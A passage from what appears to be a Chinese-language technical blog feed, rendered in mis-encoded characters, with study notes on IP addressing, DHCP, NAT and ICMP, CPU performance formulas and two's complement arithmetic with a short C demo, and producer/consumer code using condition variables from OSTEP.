align="center">å¤‡æ³¨</td><td align="center">0.0.0.0ä¸ºç‰¹æ®Šåœ°å€ï¼Œè¡¨ç¤ºæœ¬ç½‘ä¸»æœº</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center">255.255.255.255ä¸ºç‰¹æ®Šåœ°å€ï¼Œç”¨äºå®šå‘å¹¿æ’­</td></tr></tbody></table><p><strong>ç‰¹æ®Šipåœ°å€</strong></p><table><thead><tr><th align="center">ç½‘ç»œå·</th><th align="center">ä¸»æœºå·</th><th align="center">æ˜¯å¦å¯ä»¥ä½œä¸ºæºåœ°å€</th><th align="center">æ˜¯å¦å¯ä»¥ä½œä¸ºç›®çš„åœ°å€</th><th align="center">å¤‡æ³¨&#x2F;æè¿°</th></tr></thead><tbody><tr><td align="center">å…¨ä¸º0</td><td align="center">å…¨ä¸º0</td><td align="center">å…è®¸</td><td align="center">ç¦æ­¢</td><td align="center">è¡¨ç¤ºæœ¬ç½‘ä¸»æœº</td></tr><tr><td align="center">å…¨ä¸º0</td><td align="center">Host ID</td><td align="center">å…è®¸</td><td align="center">ç¦æ­¢</td><td align="center">è¡¨ç¤ºç‰¹å®šä¸»æœº</td></tr><tr><td align="center">å…¨ä¸º1</td><td align="center">å…¨ä¸º1</td><td align="center">ç¦æ­¢</td><td align="center">å…è®¸</td><td align="center">å®šå‘å¹¿æ’­åœ°å€(åªä¼šåœ¨å±€åŸŸç½‘å†…è½¬å‘)</td></tr><tr><td align="center">127</td><td align="center">ä»»æ„åˆæ³•çš„å€¼</td><td align="center">å…è®¸</td><td align="center">å…è®¸</td><td align="center">è¿‚å›åœ°å€ï¼Œç”¨äºæœ¬åœ°æµ‹è¯•</td></tr><tr><td align="center">Network ID</td><td align="center">å…¨ä¸º1</td><td align="center">ç¦æ­¢</td><td align="center">å…è®¸</td><td align="center">ç›´æ¥å¹¿æ’­åœ°å€</td></tr></tbody></table><p><strong>å†…ç½‘åœ°å€</strong></p><p>Aç±»ï¼š10.0.0.0-10.255.255.255</p><p>Bç±»ï¼š172.16.0.0-172.31.255.255</p><p>Cç±»ï¼š192.168.0.0-192.168.255.255</p><p>è‡ªåŠ¨ç§æœ‰åœ°å€ï¼š169.254.0.0&#x2F;16ï¼ˆå½“è®¡ç®—æœºæ— æ³•è·å–IPåœ°å€æ—¶è‡ªåŠ¨é…ç½®ï¼‰</p><h4 id="æ— ç±»åˆ«åŸŸé—´è·¯ç”±é€‰æ‹©-CIDR"><a href="#æ— ç±»åˆ«åŸŸé—´è·¯ç”±é€‰æ‹©-CIDR" class="headerlink" title="æ— ç±»åˆ«åŸŸé—´è·¯ç”±é€‰æ‹© CIDR"></a>æ— ç±»åˆ«åŸŸé—´è·¯ç”±é€‰æ‹© CIDR</h4><p>Classless Inter-Domain Routing</p><p>ç½‘ç»œå·éƒ¨åˆ†å¯ä»¥åœ¨ä»»æ„çš„ä½ç½®ï¼Œåœ°å€æ ¼å¼ : a.b.c.d&#x2F;x, å…¶ä¸­ x æ˜¯ åœ°å€ä¸­ç½‘ç»œå·çš„é•¿åº¦</p><h4 id="åŠ¨æ€ä¸»æœºé…ç½®åè®®-DHCP"><a href="#åŠ¨æ€ä¸»æœºé…ç½®åè®®-DHCP" class="headerlink" title="åŠ¨æ€ä¸»æœºé…ç½®åè®® DHCP"></a>åŠ¨æ€ä¸»æœºé…ç½®åè®® DHCP</h4><p>Dynamic Host Configuration Protocol</p><p>å…è®¸ä¸»æœºåœ¨åŠ å…¥ç½‘ç»œçš„æ—¶å€™ï¼ŒåŠ¨æ€åœ°ä»æœåŠ¡å™¨é‚£é‡Œè·å¾—ipç­‰å†…å®¹</p><ol><li>ä¸»æœºä»¥æºipä¸º0.0.0.0ï¼Œç›®æ ‡ipä¸º255.255.255.255çš„UDP 67å·ç«¯å£å±€åŸŸç½‘å†…å¹¿æ’­<strong>DHCPå‘ç°æŠ¥æ–‡</strong></li><li>DHCPæœåŠ¡æ”¶åˆ°ä¸€ä¸ª<strong>DHCPå‘ç°æŠ¥æ–‡</strong>æ—¶ï¼Œä½¿ç”¨æœ¬æœºipå’Œç›®æ ‡ipè®¤ä¸ºå¹¿æ’­åœ°å€çš„255.255.255.255å‘é€<strong>DHCPæä¾›æŠ¥æ–‡</strong></li><li>å‘é€ç«¯æ”¶åˆ°<strong>DHCPæä¾›æŠ¥æ–‡å</strong>å‘é€<strong>DHCPè¯·æ±‚æŠ¥æ–‡</strong></li><li>DHCPæœåŠ¡å™¨ä»¥<strong>DHCPACKæŠ¥æ–‡</strong>å›åº”<strong>è¯·æ±‚æŠ¥æ–‡</strong></li></ol><p>DHCP è¿”å› :</p><ul><li>IP åœ°å€</li><li>ç¬¬ä¸€è·³è·¯ç”±å™¨çš„ IP åœ°å€ï¼ˆé»˜è®¤ç½‘å…³ï¼‰</li><li>DNS æœåŠ¡å™¨çš„åŸŸåå’Œ IP åœ°å€</li><li>å­ç½‘æ©ç  ( æŒ‡ç¤ºåœ°å€éƒ¨åˆ†çš„ç½‘ç»œå·å’Œä¸»æœºå·</li></ul><h4 id="ç½‘ç»œåœ°å€è½¬æ¢-NAT"><a href="#ç½‘ç»œåœ°å€è½¬æ¢-NAT" class="headerlink" title="ç½‘ç»œåœ°å€è½¬æ¢ NAT"></a>ç½‘ç»œåœ°å€è½¬æ¢ NAT</h4><p>Network Address Translation</p><p>é€šè¿‡æœ¬åœ°ç½‘ç»œåªæœ‰ä¸€ä¸ªæœ‰æ•ˆå…¬ç½‘IPåœ°å€ï¼Œå¸¦åŠ¨å†…ç½‘å’Œå…¬ç½‘é€šä¿¡</p><ol><li><p>å¯¹äºå†…ç½‘å¤–å‡ºçš„æ•°æ®åŒ…NATè·¯ç”±å™¨ï¼Œæ›¿æ¢ä»–çš„æºåœ°å€å’Œç«¯å£å·ä¸ºNATIPåœ°å€å’Œæ–°çš„ç«¯å£å·ï¼Œå¹¶ç»´æŠ¤ä¸€ç§netè½¬æ¢è¡¨</p><p><img src="/2023/09/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%BD%91%E7%BB%9C%E5%B1%82/image-20230913214526811.png" alt="image-20230913214526811"></p></li><li><p>å¯¹äºè¿”å›çš„æ•°æ®åŒ…ï¼ŒNATè·¯ç”±å™¨æ›¿æ¢ç›®æ ‡IPåœ°å€å’Œç«¯å£å·ä¸ºåŸæ¥çš„å†…ç½‘ipï¼Œç«¯å£</p></li></ol><h2 id="æ§åˆ¶å¹³é¢"><a href="#æ§åˆ¶å¹³é¢" class="headerlink" title="æ§åˆ¶å¹³é¢"></a>æ§åˆ¶å¹³é¢</h2><h4 id="Dijkstraç®—æ³•"><a href="#Dijkstraç®—æ³•" class="headerlink" title="Dijkstraç®—æ³•"></a>Dijkstraç®—æ³•</h4><p><a href="https://www.bilibili.com/video/BV1JV411t7ow/">https://www.bilibili.com/video/BV1JV411t7ow/</a> çš„ 46:13 å·¦å³</p><p>ä¸€ä¸ªæºèŠ‚ç‚¹å¯¹äºé‚»å±…èŠ‚ç‚¹çš„ä»£ä»·å·²çŸ¥ï¼Œå…¶ä½™èŠ‚ç‚¹ä»£ä»·æ ‡è®°ä¸ºæ— ç©·å¤§ï¼Œä»æºèŠ‚ç‚¹åˆ°è¾¾æŸèŠ‚ç‚¹çš„ä»£ä»·æ¯”å½“å‰å°çš„è¯ï¼Œå°±æ”¹å†™æ”¹ä»£ä»·</p><p>è‡ªæ²»ç³»ç»Ÿå†…éƒ¨è·¯ç”±é€‰æ‹©åè®®:OSPF</p><p>è‡ªæ²»ç³»ç»Ÿé—´è·¯ç”±é€‰æ‹©åè®®:BGP</p><h4 id="ICMP-å› ç‰¹ç½‘æ§åˆ¶æŠ¥æ–‡åè®®"><a href="#ICMP-å› ç‰¹ç½‘æ§åˆ¶æŠ¥æ–‡åè®®" class="headerlink" title="ICMP å› ç‰¹ç½‘æ§åˆ¶æŠ¥æ–‡åè®®"></a>ICMP å› ç‰¹ç½‘æ§åˆ¶æŠ¥æ–‡åè®®</h4><p>Internet Control Message Protocol</p><p>ICMP æŠ¥æ–‡æ˜¯ä½œä¸º IP æœ‰æ•ˆè½½è·æ‰¿è½½çš„</p><p>pingå’Œtrancerouteéƒ½æ˜¯é€šè¿‡icmpå®ç°çš„</p><p>ğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•Š</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>è®¡ç®—æœºç»„æˆåŸç†</title>
      <link href="/2023/09/12/ComputerOrganization/"/>
      <url>/2023/09/12/ComputerOrganization/</url>
      
        <content type="html"><![CDATA[<h2 id="cpuæ€§èƒ½"><a href="#cpuæ€§èƒ½" class="headerlink" title="cpuæ€§èƒ½"></a>cpuæ€§èƒ½</h2><p>æ—¶é’Ÿå‘¨æœŸé•¿åº¦(clock period): æ¯ä¸ªæ—¶é’Ÿå‘¨æœŸçš„æ—¶é—´é•¿åº¦</p><p>æ—¶é’Ÿå‘¨æœŸæ•°(clock cycle): ä»¥æ—¶é’Ÿå‘¨æœŸé•¿åº¦ä¸ºå•ä½</p><p>CPI(Clock cycles Per Instruction) è¡¨ç¤ºæ‰§è¡Œæ¯æ¡æŒ‡ä»¤æ‰€éœ€çš„å¹³å‡æ—¶é’Ÿå‘¨æœŸæ•°</p><p>MIPS(Million Instructions Per Second) æ¯ç§’ç™¾ä¸‡æ¡æŒ‡ä»¤</p><p>$$æ€§èƒ½&#x3D;\frac{1}{æ‰§è¡Œæ—¶é—´} $$</p><p>$$æ—¶é’Ÿå‘¨æœŸé•¿åº¦&#x3D;\frac{1}{æ—¶é’Ÿé¢‘ç‡}$$</p><p>$$ç¨‹åºçš„CPUæ‰§è¡Œæ—¶é—´ ï¼ ç¨‹åºçš„æŒ‡ä»¤æ•° \timesæ¯æ¡æŒ‡ä»¤çš„å¹³å‡æ—¶é’Ÿå‘¨æœŸæ•°CPI \times æ—¶é’Ÿå‘¨æœŸé•¿åº¦$$</p><p>$$MIPS&#x3D;\frac{æŒ‡ä»¤æ•°}{æŒ‡ä»¤æ—¶é—´\times10^6}&#x3D;\frac{æŒ‡ä»¤æ•°}{æŒ‡ä»¤æ•°\times CPI \times æŒ‡ä»¤å‘¨æœŸé•¿åº¦\times10^6}&#x3D;\frac{1}{CPI\timesæŒ‡ä»¤å‘¨æœŸé•¿åº¦\times10^6}&#x3D;\frac{æ—¶é’Ÿé¢‘ç‡}{CPI\times10^6}$$</p><h2 id="è¡¥ç -infty-æ€è€ƒ"><a href="#è¡¥ç -infty-æ€è€ƒ" class="headerlink" title="è¡¥ç $\infty$æ€è€ƒ"></a>è¡¥ç $\infty$æ€è€ƒ</h2><p><strong>è®¡ç®—æœºæœ‰æ•´æ•°ç¬¦å·æ•°ä¸ºä»€ä¹ˆä¸ç”¨ç¬¦å·åŠå€¼è¡¨ç¤ºæ³•è€Œæ˜¯è¡¥ç </strong></p><ul><li>ä¼šæµªè´¹1bitå†…å­˜ï¼Œæ¯”å¦‚æœ‰+0å’Œ-0ä¸¤ä¸ª0</li><li>å®ƒçš„åŠ ã€å‡æ³•è¿ç®—åˆ†åˆ«ç”¨åŠ æ³•å™¨å’Œå‡æ³•å™¨å®ç°å¢åŠ ç¡¬ä»¶è®¾è®¡å¤æ‚æ€§ æ¯”å¦‚1å­—èŠ‚ä¸­+1: 0000 0001 ,-1: 1000 0001,zåˆ™(+1)+(-1)å¦‚æœå•çº¯ç”¨åŠ æ³•å™¨åˆ™å¾—åˆ°1000 0010: -2ï¼Œemmï¼Œå¦‚æœæƒ³å¾—åˆ°æ­£ç¡®ç»“æœéœ€è¦cpuä¿®æ­£</li><li>è¡¥ç å¯ä»¥è§£å†³ä¸Šè¿°é—®é¢˜ï¼Œç¬¦å·åŠå€¼è¡¨ç¤ºæ³•ä¸»è¦ç”¨äºæµ®ç‚¹æ•°ä¸­</li></ul><p><strong>æ±‚è¡¥ç çš„è¿ç®—ä¸ºä»€ä¹ˆä¼šæ˜¯å„ä½å–ååŠ 1ï¼Ÿ</strong></p><p>nä½2è¿›åˆ¶è¿ç®—ä¸­ï¼Œæ•°Pçš„è¡¥æ•°Qåˆ™æœ‰ $ P + Q &#x3D; 2^{n}$</p><p>æ±‚nä½äºŒè¿›åˆ¶æ•°<strong>N</strong>çš„è¡¥å°±å˜ä¸ºäº† $2^n-N&#x3D;2^n-1-N+1$</p><p>å…¶ä¸­$2^n-1-N&#x3D;11â€¦1-N$ å¯¹äºNçš„ç¬¬ i ä½ n<sub>i</sub> æ¥è¯´å°±ç›¸å½“äºå–åï¼Œ$1-n_i&#x3D;\overline{n_i}$</p><p>æ‰€ä»¥å°±ç›¸å½“äºå¯¹Nå„ä½å–ååŠ 1</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="type">uint8_t</span> val, res1, res2;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span> == <span class="built_in">scanf</span>(<span class="string">&quot;%hhd&quot;</span>, &amp;val)) &#123;</span><br><span class="line">      res1 = <span class="number">255</span> - val + <span class="number">1</span>; <span class="comment">//è¿™é‡Œç”¨255+1è€Œä¸æ˜¯256è¿˜æœ‰ä¸€ä¸ªåŸå› å°±æ˜¯å‡å¦‚æœºå™¨å­—é•¿ä¸º8ä½ï¼Œæœ€å¤§åªèƒ½è¡¨ç¤º255</span></span><br><span class="line">      res2 = (~val) + <span class="number">1</span>;</span><br><span class="line">      assert(res1==res2);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;255 - x + 1 \t:%hhd\n(~val) + 1 \t:%hhd\n&quot;</span>, res1, res2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="string">&#x27;\n&#x27;</span>!=getchar())</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä»£ç ï¼Œå¯¹äº-128(1000 0000)çš„ç»“æœä»ç„¶æ˜¯-128(1000 0000)ï¼Œåº”ä¸º8bitæœ€å¤§åªèƒ½è¡¨ç¤º127,æœ‰æ—¶å¯èƒ½ä¼šå¼•å‘æŸäº›å®‰å…¨æ¼æ´</p><p><strong>è¡¥ç çš„é€†å‘æ€è€ƒè¿‡ç¨‹</strong></p><p>æŒ‰ç…§ä¸€ä¸ªå­—èŠ‚æ¥è¯´ï¼Œæˆ‘ä»¬æƒ³è¦-1 + 1 &#x3D; 0ï¼Œå³ 0000 0001+ï¼Ÿ&#x3D;0</p><p>åªè¦ï¼Ÿæ»¡è¶³äº†ç­‰äº0æˆ‘ä»¬å°±å¯ä»¥è®¤ä¸ºè¿™ä¸ªï¼Ÿå°±æ˜¯-1ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æº¢å‡ºæ¥çš„åˆ°0</p><figure class="highlight latex"><table><tr><td class="code"><pre><span class="line">   0000 0001----&gt; +1</span><br><span class="line">+  1111 1111----&gt; -1</span><br><span class="line"> 1 0000 0000----&gt;  0</span><br></pre></td></tr></table></figure><p>emmï¼Œé«˜ä½1æº¢å‡ºï¼Œå¾—åˆ°0,è¿™æ ·æŠŠæœ€é«˜ä½å½“ä½œç¬¦å·ä½ï¼Œå‘ç°æº¢å‡ºå®ç°è¿™ä¸ªè¿˜æŒºå¥½ç”¨hh</p><p>æ‰€ä»¥éè´Ÿæ•°åªèƒ½ç”¨æœ€ä½7ä½è¡¨ç¤º$[0,2^7-1]$ï¼Œè´Ÿæ•°åˆ™ä¸º$[-2^7,-1]$</p><p>å¯¹äºnä½äºŒè¿›åˆ¶å°±æ˜¯$[-2^{n-1},2^{n-1}-1]$</p><blockquote><p>ä¸ªäººè®¤ä¸ºè¡¥ç æä¾›äº†ä¸€ç§åŠ å‡æ³•ç»Ÿä¸€æŒ‰ç…§æ— ç¬¦å·æ•°åŠ æ³•è¿ç®—çš„æœºä¼šï¼Œæ ¹æ®è§£é‡Šæ–¹æ³•çš„ä¸åŒï¼Œèµ‹äºˆè¿ç®—è¿‡ç¨‹å’Œç»“æœä¸åŒçš„æ„ä¹‰ï¼Œé™ä½ç¡¬ä»¶è®¾è®¡çš„å¤æ‚åº¦</p></blockquote><p><strong>å¯¹äºä¸€ä¸ªæ•°æ±‚ä¸¤æ¬¡è¡¥ç ä¼šæ˜¯å®ƒæœ¬èº«</strong></p><p>è¿™ä¹Ÿå’Œæˆ‘ä»¬è®¤çŸ¥é‡Œçš„$-(-A)&#x3D;A$ç¬¦åˆï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§å¿«é€Ÿçš„æ±‚è§£è´Ÿæ•°è¡¥ç è¡¨ç¤ºçš„æ•°å€¼ï¼Œæ¯”å¦‚æ±‚ç¬¦å·ä½ä¸º1çš„è¡¥ç Aï¼Œä»–æ˜¯æ­£æ•°Bçš„è¡¥ç ï¼Œæ‰€ä»¥å¯¹Aå†æ¬¡æ±‚è¡¥ï¼Œå°±ä¼šå¾—åˆ°Bï¼ŒAå°±æ˜¯-B</p><p><strong>è¡¥ç (æœ‰ç¬¦å·æ•°)åŠ å‡æ³•æº¢å‡º</strong></p><p>è®¾Açš„ç¬¦å·ä½ä¸ºaï¼ŒBçš„ç¬¦å·ä¸ºBï¼ŒA+Bç¬¦å·ä¸ºs</p><p>æ˜¯å¦æº¢å‡ºåˆ¤æ–­æ ‡å‡†$Overflow&#x3D;\overline{a}\overline{b}s+ab\overline{s}$</p><ul><li>ä¸¤ä¸ªæ­£æ•°ç›¸åŠ ï¼Œç»“æœä¸ºè´Ÿæ•°ï¼Œæº¢å‡º</li><li>ä¸¤ä¸ªè´Ÿæ•°ç›¸åŠ ï¼Œç»“æœä¸ºæ­£æ•°ï¼Œæº¢å‡º</li><li>æ•´æ•°å’Œè´Ÿæ•°ç›¸åŠ (å³å‡æ³•)ä¸å¯èƒ½æº¢å‡ºï¼Œå› ä¸ºå’Œä¸å¯èƒ½å¤§äºå…¶ä¸­ä»»ä½•ä¸€ä¸ªæ“ä½œæ•°</li></ul><p><strong>è¾¹ç•Œæ£€æµ‹çš„ç®€ä¾¿æ–¹æ³•</strong></p><p>å°†æœ‰ç¬¦å·æ•°çœ‹ä½œæ— ç¬¦å·æ•°æ¥å¤„ç†</p><p>æ¯”å¦‚ï¼Œå¯¹äºå¤§å°X11çš„æ•°ç»„ï¼Œç´¢å¼•X20çš„è¾¹ç•Œæ£€æŸ¥éœ€è¦ä¸æ»¡è¶³X20&gt;&#x3D;X11 or X20&lt;0 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SUBS XZRï¼ŒX20ï¼ŒX11</span><br><span class="line">BHS IndexOutOfBounds;HS:unsigned high or sameï¼Œå¤§äºæˆ–ç­‰äºå°±è·³è½¬,å³X20ç¬¦å·ä½ä¸º1 æˆ–è€… ç¬¦å·ä½ä¸º0ä¸”å¤§äºæ—¶æ‰è·³è½¬</span><br></pre></td></tr></table></figure><p>armé‡Œcmpå°±æ˜¯ç”¨SUBS XZRï¼ŒX1ï¼ŒX2å®ç°çš„</p><p>ä½†æ˜¯è¿™é‡ŒBHSéœ€è¦carryä½&#x3D;&#x3D;1è·³ï¼Œå³carry&#x3D;=1ä»£è¡¨X20&gt;&#x3D;X11ï¼Œ<strong>å’ŒX86æ­£å¥½æ˜¯ç›¸åçš„</strong></p><p>çŒœæµ‹åŸå› æ˜¯å› ä¸ºSUBS XZRï¼ŒX1ï¼ŒX2 &#x3D; X1 + not(X2) + 1 ç”¨åŠ æ³•å™¨æ¥å®ç°ï¼Œä¹Ÿç¬¦åˆå¤§äºç­‰äºçš„ç»“æœ(ç­‰äºå°±æ˜¯æ­£å¥½æº¢å‡ºæ—¶çš„æƒ…å†µ)</p><h2 id="æµ®ç‚¹-infty-æ€è€ƒ"><a href="#æµ®ç‚¹-infty-æ€è€ƒ" class="headerlink" title="æµ®ç‚¹$\infty$æ€è€ƒ"></a>æµ®ç‚¹$\infty$æ€è€ƒ</h2><p>ä¹‹å‰æœ‰è®¨è®ºè¿‡iee754ä¸¤ä¸ªæ¯”è¾ƒæœ‰æ„æ€çš„äº‹æƒ…</p><p>æµ®ç‚¹æ•°è¡¨ç¤ºåŠä¼ å‚: <a href="https://grxer.gitee.io/2023/04/17/An-interview-question-from-baidu/">https://grxer.gitee.io/2023/04/17/An-interview-question-from-baidu/</a></p><p>æµ®ç‚¹æ•°è¿ç®—è¯¯å·®åŠå‡å°: <a href="https://grxer.gitee.io/2023/04/23/floating-point-calculation-and-kahan/">https://grxer.gitee.io/2023/04/23/floating-point-calculation-and-kahan/</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>OSTEP:30&amp;&amp;31 æ¡ä»¶å˜é‡&amp;&amp;ä¿¡å·é‡</title>
      <link href="/2023/09/10/OSTEP-30-31-Condition-Semaphores/"/>
      <url>/2023/09/10/OSTEP-30-31-Condition-Semaphores/</url>
      
        <content type="html"><![CDATA[<h2 id="æ¡ä»¶å˜é‡å®ç°ç”Ÿäº§è€…-x2F-æ¶ˆè´¹è€…"><a href="#æ¡ä»¶å˜é‡å®ç°ç”Ÿäº§è€…-x2F-æ¶ˆè´¹è€…" class="headerlink" title="æ¡ä»¶å˜é‡å®ç°ç”Ÿäº§è€…&#x2F;æ¶ˆè´¹è€…"></a>æ¡ä»¶å˜é‡å®ç°ç”Ÿäº§è€…&#x2F;æ¶ˆè´¹è€…</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> buffer[MAX];</span><br><span class="line"><span class="type">int</span> fill = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> use = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">put</span><span class="params">(<span class="type">int</span> value)</span> &#123;</span><br><span class="line">  buffer[fill] = value;</span><br><span class="line">  fill = (fill + <span class="number">1</span>) % MAX;</span><br><span class="line">  count++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">get</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> tmp = buffer[use];</span><br><span class="line">  use = (use + <span class="number">1</span>) % MAX;</span><br><span class="line">  count--;</span><br><span class="line">  <span class="keyword">return</span> tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">cond_t</span> empty, fill;</span><br><span class="line"><span class="type">mutex_t</span> mutex;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">producer</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; loops; i++) &#123;</span><br><span class="line">    Pthread_mutex_lock(&amp;mutex);          <span class="comment">// p1</span></span><br><span class="line">    <span class="keyword">while</span> (count == MAX)                 <span class="comment">// p2</span></span><br><span class="line">      Pthread_cond_wait(&amp;empty, &amp;mutex); <span class="comment">// p3</span></span><br><span class="line">    put(i);                              <span class="comment">// p4</span></span><br><span class="line">    Pthread_cond_signal(&amp;fill);          <span class="comment">// p5</span></span><br><span class="line">    Pthread_mutex_unlock(&amp;mutex);        <span class="comment">// p6</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">consumer</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; loops; i++) &#123;</span><br><span class="line">    Pthread_mutex_lock(&amp;mutex);         <span class="comment">// c1</span></span><br><span class="line">    <span class="keyword">while</span> (count == <span class="number">0</span>)                  <span class="comment">// c2</span></span><br><span class="line">      Pthread_cond_wait(&amp;fill, &amp;mutex); <span class="comment">// c3</span></span><br><span class="line">    <span class="type">int</span> tmp = get();                    <span class="comment">// c4</span></span><br><span class="line">    Pthread_cond_signal(&amp;empty);        <span class="comment">// c5</span></span><br><span class="line">    Pthread_mutex_unlock(&amp;mutex);       <span class="comment">// c6</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, tmp);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¡ä»¶å˜é‡ä½¿ç”¨æŠ€å·§</p><ul><li>Pthread_cond_signalå‘ä¿¡å·æ—¶æ€»æ˜¯æŒæœ‰é”</li><li>å¯¹æ¡ä»¶å˜é‡ä½¿ç”¨ whileï¼ˆä¸æ˜¯ ifï¼‰</li></ul><blockquote><p><strong>ä¾‹å­ç”Ÿäº§è€…&#x2F;æ¶ˆè´¹è€…p2å’Œc2ä¸ºä»€ä¹ˆç”¨whileï¼Ÿ</strong></p><p>å¦‚æœç”¨ifï¼Œè€ƒè™‘ä¸€ä¸ªç”Ÿäº§è€…Tpï¼Œä¸¤ä¸ªæ¶ˆè´¹è€…Tc1å’ŒTc2ï¼ŒTc1å…ˆæ‰§è¡Œæ­¤æ—¶bufferé‡Œæ²¡æœ‰æ•°æ®ï¼Œæ‰§è¡Œåˆ°c3ä¼‘çœ ï¼ŒTpéšåæ‰§è¡Œï¼Œæ”¾å…¥æ•°æ®åï¼Œæ‰§è¡Œåˆ°p5å”¤é†’Tc1,Tc1è¿›å…¥å°±ç»ªæ€è¿˜æœªè¿è¡Œæ—¶ï¼ŒTc2æ‰§è¡Œæ‹¿èµ°äº†bufferé‡Œæ‰€æœ‰æ•°æ®ï¼ŒéšåTc1è¿è¡Œï¼Œå¦‚æœæ—¶ifç›´æ¥å°±å¥½æ‰§è¡Œc4å»getç©ºçš„bufferé‡Œçš„æ•°æ®ï¼Œè§¦å‘é”™è¯¯ï¼Œå¦‚æœæ—¶whileè¿˜ä¼šæ£€æµ‹(count&#x3D;&#x3D;0)ä¸€äº›ç¼“å†²åŒºæ˜¯å¦æœ‰æ•°æ®ï¼Œä»è€Œé¿å…é”™è¯¯</p><p><strong>ä¸ºä»€ä¹ˆç”¨äº†ä¸¤ä¸ªæ¡ä»¶å˜é‡empty, fillï¼Ÿ</strong></p><p>æ˜¯ä¸ºäº†å®ç°æ¶ˆè´¹è€…ä¸åº”è¯¥å”¤é†’æ¶ˆè´¹è€…ï¼Œè€Œåº”è¯¥åªå”¤é†’ç”Ÿäº§è€…ï¼ŒåŒæ ·ç”Ÿäº§è€…åªèƒ½å”¤é†’æ¶ˆè´¹è€…</p><p>å¦‚æœå…±ç”¨ä¸€ä¸ªæ¡ä»¶å˜é‡ï¼Œå³æ¶ˆè´¹è€…å¯ä»¥å”¤é†’æ¶ˆè´¹è€…ï¼Œè¯•æƒ³ç¼“å†²åŒºæ²¡æœ‰æ•°æ®Tc1ï¼ŒTc2ä¼‘çœ ï¼ŒéšåTpæ”¾å…¥ä¸€ä¸ªæ•°æ®åç¡çœ ï¼ŒTc1å”¤é†’æ‹¿èµ°æ•°æ®ï¼Œå¦‚æœæ­¤æ—¶å”¤é†’Tc2ï¼ŒTc2å‘ç°æ²¡æœ‰æ•°æ®ç»§ç»­ç¡çœ ï¼Œæ­¤æ—¶ä¸‰ä¸ªéƒ½åœ¨ç¡çœ ï¼Œå½¢æˆæ­»é”</p></blockquote><p>ä¸€ä¸ªæ¯”è¾ƒå½¢è±¡çš„ä¾‹å­ï¼Œä¸‹é¢çš„ä»£ç æ‰“å°å·¦æ‹¬å·ä»£è¡¨ç”Ÿäº§ï¼Œå³æ‹¬å·ä»£è¡¨å–èµ°</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;thread-sync.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;thread.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, count = <span class="number">0</span>;</span><br><span class="line"><span class="type">mutex_t</span> lk = MUTEX_INIT();</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Tproduce</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">  retry:</span><br><span class="line">    mutex_lock(&amp;lk);</span><br><span class="line">    <span class="keyword">if</span> (count == n) &#123;<span class="comment">//ç¼“å†²åŒºç”Ÿäº§æ»¡äº†</span></span><br><span class="line">      mutex_unlock(&amp;lk);</span><br><span class="line">      <span class="keyword">goto</span> retry;</span><br><span class="line">    &#125;</span><br><span class="line">    